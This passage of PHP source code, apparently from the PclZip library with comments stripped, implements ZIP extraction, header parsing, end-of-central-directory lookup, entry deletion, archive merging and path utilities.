  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

